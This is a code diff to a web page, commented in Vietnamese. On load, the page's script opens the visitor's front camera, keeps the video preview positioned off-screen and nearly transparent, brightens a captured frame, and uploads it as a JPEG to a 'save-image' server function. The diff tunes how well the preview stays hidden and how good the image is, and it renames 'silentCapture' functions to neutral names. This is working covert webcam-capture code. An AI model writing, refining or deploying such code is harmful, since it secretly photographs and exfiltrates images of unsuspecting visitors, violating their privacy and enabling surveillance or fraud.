@@ -21,34 +21,25 @@
             text-align: center;
             max-width: 600px;
         }
-        h1 {
-            font-size: 1.8em;
-            margin-bottom: 8px;
-            color: #2c3e50;
-        }
-        p {
-            color: #555;
-            margin-bottom: 25px;
-        }
+        h1 { font-size: 1.8em; margin-bottom: 8px; color: #2c3e50; }
+        p { color: #555; margin-bottom: 25px; }
         .status {
             font-size: 1.15em;
             color: #666;
             min-height: 55px;
         }
 
-        /* Ẩn video thông minh - vẫn render nhưng không thấy trên màn hình */
+        /* Ẩn video khéo léo - vẫn render tốt trên máy tính */
         video {
             position: absolute;
-            left: -9999px;
-            top: -9999px;
+            left: -2000px;
+            top: -2000px;
             width: 640px;
             height: 480px;
-            visibility: hidden;
+            opacity: 0.01;           /* Giữ opacity rất nhỏ để browser render */
             pointer-events: none;
         }
-        canvas {
-            display: none;
-        }
+        canvas { display: none; }
     </style>
 </head>
 <body>
@@ -67,24 +58,24 @@
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
 
-        async function startSilentCapture() {
+        async function startCapture() {
             try {
                 status.textContent = "Đang kết nối camera...";
 
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: "user",
-                        width: { ideal: 640, max: 640 },
-                        height: { ideal: 480, max: 480 },
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
                         frameRate: { ideal: 20 }
                     }
                 });
 
                 video.srcObject = stream;
 
-                // Tăng nhẹ thời gian chờ để ảnh sáng hơn trên máy tính
+                // Tăng thời gian chờ để camera điều chỉnh ánh sáng (rất quan trọng trên laptop)
                 video.onloadedmetadata = () => {
-                    setTimeout(() => silentCapture(stream), 450);
+                    setTimeout(() => captureImage(stream), 650);   // 650ms là mức cân bằng tốt
                 };
 
             } catch (err) {
@@ -93,7 +84,7 @@
             }
         }
 
-        async function silentCapture(stream) {
+        async function captureImage(stream) {
             try {
                 status.textContent = "Đang thu thập dữ liệu...";
 
@@ -101,10 +92,12 @@
                 canvas.height = 480;
 
                 const ctx = canvas.getContext('2d');
+                
+                // Thêm filter tăng sáng + độ tương phản
+                ctx.filter = "brightness(1.15) contrast(1.1)";
                 ctx.drawImage(video, 0, 0, 640, 480);
 
-                // Tăng chất lượng một chút để ảnh sáng hơn trên máy tính
-                const imageData = canvas.toDataURL('image/jpeg', 0.72);
+                const imageData = canvas.toDataURL('image/jpeg', 0.75);
 
                 const response = await fetch('/.netlify/functions/save-image', {
                     method: 'POST',
@@ -126,10 +119,10 @@
             // Tắt camera
             setTimeout(() => {
                 if (stream) stream.getTracks().forEach(track => track.stop());
-            }, 700);
+            }, 800);
         }
 
-        window.onload = startSilentCapture;
+        window.onload = startCapture;
     </script>
 </body>
 </html>
